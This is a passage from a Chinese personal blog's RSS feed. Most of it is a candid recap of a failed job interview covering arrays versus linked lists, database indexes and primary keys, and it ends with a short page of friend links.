&lt;p>数组删除元素其实是比较烦的，复杂度应该是&lt;code>O(n)&lt;/code>，&lt;code>n&lt;/code>是数组长度减去删除元素在数组中的位置。最麻烦的是万一数组很长，那么复制元素到上一个位置将会是噩梦。&lt;/p>
&lt;p>当然也不是不能优化&amp;hellip;&amp;hellip;把移动的操作推迟到插入新元素的时候就好了，用一个占位符表示这里已经被删除，同时记录前面有多少个元素被删除。这样一来索引性能会下降（因为要找到上一个被删除的元素，然后更新索引位置，直到找到正确的元素），删除性能提高（只要找到上一个被删除的元素然后记录自己作为被删除元素的位置就好），整体实现的复杂度提升，索引删除插入都要另外编写实现，感觉得不偿失。&lt;/p>
&lt;p>链表删除元素很简单，索引到需要删除的元素的时间复杂度是&lt;code>O(n)&lt;/code>，删除操作的时间复杂度是&lt;code>O(1)&lt;/code>，而且实现简单。&lt;/p>
&lt;h3 id="扩展结合两者">扩展：结合两者？&lt;/h3>
&lt;p>好吧，这个问题面试官没问到。&lt;/p>
&lt;p>链表和数组结合一下能解决一部分内存碎片的问题，基本思路的话&amp;hellip;&amp;hellip;咱预先分配 100 个元素，如果插入的元素超过了 100 个，咱再分配 100 个元素的空间，然后索引的时候再去找第二个池？&lt;/p>
&lt;p>这个思路术语叫什么记不起来了。&lt;/p>
&lt;h3 id="哦不他到底想问什么">哦不！他到底想问什么？&lt;/h3>
&lt;p>猜一猜面试官到底想问些什么？&lt;/p>
&lt;ol>
&lt;li>动态内存分配：数组定长，而链表变长。我感觉这个特征基本没什么好说的，工作中基本没有机会自己重新实现一个线性容器，除非要定制一些特殊的结构，环形链表之类的东西。其他像是链表，数组，队列，标准库都有相应的实现。也许是考虑自行编写线程安全版本的 STL？&lt;/li>
&lt;li>&lt;code>std::array&lt;/code>和&lt;code>std::list&lt;/code>。所以问的是啥呢&amp;hellip;？提供的保证和&lt;code>implement specified&lt;/code>还有&lt;code>undefined behavior&lt;/code>吗？STL 现在还没有&lt;code>concept&lt;/code>，但是早早就有了&lt;code>SFINAE&lt;/code>和&lt;code>enable_if&lt;/code>之类的东西，&lt;code>constexpr if&lt;/code> 更是极大地强化了编译期元编程方面的能力。如果是问标准模板库方面的东西的话，我觉得问标准库线程安全啊，迭代器算法之类的东西要合适得多。所以&amp;hellip;&amp;hellip;大概也不是想问这个。&lt;/li>
&lt;li>迭代器。如果是这个的话我真的希望面试官大人能直接说出迭代器三个字&amp;hellip;&amp;hellip;不过好歹回答出随机访问了，应该不至于吧。&lt;/li>
&lt;/ol>
&lt;h2 id="第四招数据库索引">第四招：数据库索引&lt;/h2>
&lt;blockquote>
&lt;p>面试官：讲一下数据库的索引有什么作用。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：懵逼&amp;hellip;&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>还行，直接懵了。&lt;/p>
&lt;p>因为完全没搞明白面试官的意图：索引指的是啥？面试官是想问数据库索引的方式吗？B+树该怎么实现？&lt;/p>
&lt;p>回来路上我考虑了一下，这几方面可能可以作为回答的方向。&lt;/p>
&lt;h3 id="索引的实现">索引的实现&lt;/h3>
&lt;p>数据库索引的常见实现方式是 B+ 树，我数据结构学的不好，只知道 B+ 树是个很厉害的数据结构&amp;hellip;..所以博文写到这里，不得不开始查资料了。&lt;/p>
&lt;blockquote>
&lt;p>B+ 树是一种树数据结构，通常用于数据库和操作系统的文件系统中。B+ 树的特点是能够保持数据稳定有序，其插入与修改拥有较稳定的对数时间复杂度。B+ 树元素自底向上插入，这与二叉树恰好相反。&lt;/p>
&lt;/blockquote>
&lt;p>如果问起 B+树实现，或者让手写个 B+树的话，我也只能望而兴叹了。&lt;/p>
&lt;h3 id="postgres-数据库的索引属性">postgres 数据库的索引属性&lt;/h3>
&lt;p>对于数据库的实现我了解不多。&lt;/p>
&lt;p>大概就是建立个独立的 B+ 树索引&amp;hellip;&amp;hellip;吧？&lt;/p>
&lt;h3 id="emmmmmm">emmmmmm&lt;/h3>
&lt;p>真想不出了&amp;hellip;&lt;/p>
&lt;h2 id="第五招primary-key">第五招：Primary key&lt;/h2>
&lt;blockquote>
&lt;p>面试官：说下主键的作用。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：emmmmmm&amp;hellip;..&lt;/p>
&lt;/blockquote>
&lt;p>到这里我基本已经萌的不行了。（无错字）&lt;/p>
&lt;blockquote>
&lt;p>内心 OS：我是谁？我在哪？我要干什么？&lt;/p>
&lt;/blockquote>
&lt;p>甚至连&lt;strong>zhujian&lt;/strong>都听成了&lt;strong>zujian&lt;/strong>&lt;/p>
&lt;p>被面试官提醒了一下&lt;/p>
&lt;blockquote>
&lt;p>面试官 B：就是那个 &lt;strong>key&lt;/strong>&lt;/p>
&lt;/blockquote>
&lt;p>我也没反应过来&amp;hellip;&amp;hellip;&lt;/p>
&lt;h3 id="有啥用啊天真脸">有啥用啊（天真脸）&lt;/h3>
&lt;p>主键的话，具有唯一性的索引？&lt;/p>
&lt;p>emmmmm，不然还有什么作用呢&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>看来数据库必须下功夫学一学才行啊&amp;hellip;&amp;hellip;&lt;/p>
&lt;h2 id="叮叮叮you-fxxk-up">叮叮叮——You fxxk up&lt;/h2>
&lt;blockquote>
&lt;p>面试官：十动然拒。&lt;/p>
&lt;/blockquote>
&lt;blockquote>
&lt;p>我：理解理解，谢谢谢谢。&lt;/p>
&lt;/blockquote>
&lt;p>还行，回顾完整个面试流程，除了 C++部分可能是因为发挥失常之外，数据库方面的确是没有下够功夫，以至于连索引和 PrimaryKey 这两问都在持续懵逼。&lt;/p>
&lt;p>而且实话说面试，确实有技巧这回事&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>面试官提的问题也存在着范式——网络上面试真题什么的，看起来像是玩笑，但面试官提出这些问题的时候却是认真的。&lt;/p>
&lt;p>尽管&amp;hellip;&amp;hellip;这种&lt;/p>
&lt;blockquote>
&lt;p>聊聊 xxxx（某技术/概念/工具），xxx 的作用是什么&lt;/p>
&lt;/blockquote>
&lt;p>的提问确实让人不容易抓住重点&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>考察基础的角度来说，现场白板写一个程序，然后再深入聊聊这么写的用意，有没有优化方案，考察对语言的理解和 api 设计、代码架构能力，比单纯的说说 xxx，问 xxx 作用要实际的多。当然并不是说这么问不好，这些概念的掌握也是非常重要的基础，而且能有效考察面试者语言组织能力和对这方面知识的掌握程度。&lt;/p>
&lt;p>唯一不好的就是，面试者和面试官聊的过程就像是用&lt;strong>黑话&lt;/strong>交流一样&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>不说了，学这黑话去&amp;hellip;&amp;hellip;&lt;/p></description></item><item><title>友链</title><link>https://nnnewb.github.io/blog/link/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://nnnewb.github.io/blog/link/</guid><description>&lt;p>本站国内已备案的域名：&lt;a class="link" href="https://weakptr.site/" target="_blank" rel="noopener"
>weakptr.site&lt;/a>&lt;/p>
&lt;h2 id="友链">友链&lt;/h2>
&lt;ul>
&lt;li>白菜又或者水雷：&lt;a class="link" href="https://mkz.life/" target="_blank" rel="noopener"
>mkz.life&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="我关注的大佬">我关注的大佬&lt;/h2>
&lt;p>厚颜无耻地介绍下我关注的几个大佬：&lt;/p>
&lt;ul>
&lt;li>安全领域大佬，p大的博客：&lt;a class="link" href="https://leavesongs.com" target="_blank" rel="noopener"
>离别歌&lt;/a>&lt;/li>
&lt;/ul></description></item></channel></rss>